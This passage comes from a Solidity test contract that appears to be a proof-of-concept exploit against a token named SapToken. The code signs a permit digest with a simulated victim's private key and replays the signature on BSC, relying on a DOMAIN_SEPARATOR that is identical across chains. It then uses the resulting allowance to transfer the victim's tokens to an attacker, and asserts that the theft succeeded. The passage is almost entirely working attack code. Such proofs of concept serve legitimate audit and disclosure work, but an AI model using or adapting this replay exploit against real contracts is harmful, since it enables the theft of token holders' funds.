            abi.encodePacked(
                "\x19\x01",
                ISapToken(TARGET).DOMAIN_SEPARATOR(),
                keccak256(abi.encode(
                    0x6e71EDAe12b1b97f4d1f60370feF10105Fa2Faae0126114a169c64845d6126c9, // PERMIT_TYPEHASH
                    owner,
                    spender,
                    amount,
                    nonce,
                    deadline
                ))
            )
        );

        // Step 5: Sign the digest with victim's private key
        // This simulates the victim signing on another chain (e.g., Ethereum)
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPrivateKey, digest);

        // Step 6: Replay the signature on current chain (BSC)
        // This works because DOMAIN_SEPARATOR is identical across chains
        ISapToken(TARGET).permit(owner, spender, amount, deadline, v, r, s);

        // Step 7: Verify allowance was set
        uint256 allowance = ISapToken(TARGET).allowance(victim, attacker);
        require(allowance == amount, "Allowance should be set");

        // Step 8: Transfer tokens from victim to attacker
        ISapToken(TARGET).transferFrom(victim, attacker, amount);

        // Step 9: Verify attack succeeded
        uint256 attackerBalanceAfter = ISapToken(TARGET).balanceOf(attacker);
        require(attackerBalanceAfter == amount, "Attacker should have stolen tokens");

        // Log success
        console.log("Initial victim balance:", victimBalance);
        console.log("Final attacker balance:", attackerBalanceAfter);
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
